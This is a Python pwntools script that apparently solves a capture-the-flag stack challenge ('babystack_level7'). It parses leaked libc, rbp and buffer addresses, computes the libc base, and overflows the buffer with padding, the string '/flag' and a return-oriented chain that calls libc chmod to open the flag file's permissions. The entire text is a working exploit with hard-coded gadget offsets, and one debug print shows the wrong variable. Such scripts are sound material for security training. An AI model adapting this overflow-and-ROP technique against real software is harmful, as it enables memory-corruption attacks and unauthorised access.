import pwn
import struct
from pwn import *

def rop_chain(base):
    # From gadgets
    # Use ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" 
    # objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
    pop_rdi = p64(base + 0x23b6a)
    pop_rsi = p64(base + 0x2601f)
    permission_code = p64(0x7)
    chmod = p64(base + 0x10db60)

    # Put value of the flag in the buffer first (rbp), then send that value as argument to pop rdi.. then send the permission code to rsi.. finally call chmod syscall
    chain = pop_rdi + p64(rbp) +  pop_rsi + permission_code + chmod
    return chain

io = pwn.process("/challenge/babystack_level7")

# Get the leaked value of the system function
io.recvuntil("located at ")
leaked_system = int(io.recvline(keepends=False),16)

# Get the rbp value
io.recvuntil("rbp: ")
rbp = int(io.recvline(keepends=False),16)
print(f"rbp read from output: 0x{rbp:x}")

# Get the buff value
io.recvuntil("stored: ")
buff = int(io.recvline(keepends=False),16)
print(f"buff stored at: 0x{rbp:x}")

# Find the system offset by doing objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
system_offset = 0x52290

# Find the libc base by subtracting system's offset from the leaked address
libc_base = leaked_system - system_offset
print(f"libc_base is: {hex(libc_base)}")

# Calculate the padding by doing rbp - buff (Not adding 8 because we want to store the flag in rbp, rather than some random 8 bytes of a)
padding = rbp - buff
flag_string = b'/flag\x00ab'

exploit = b'a' * padding + flag_string + rop_chain(libc_base)

io.send(exploit)
io.interactive()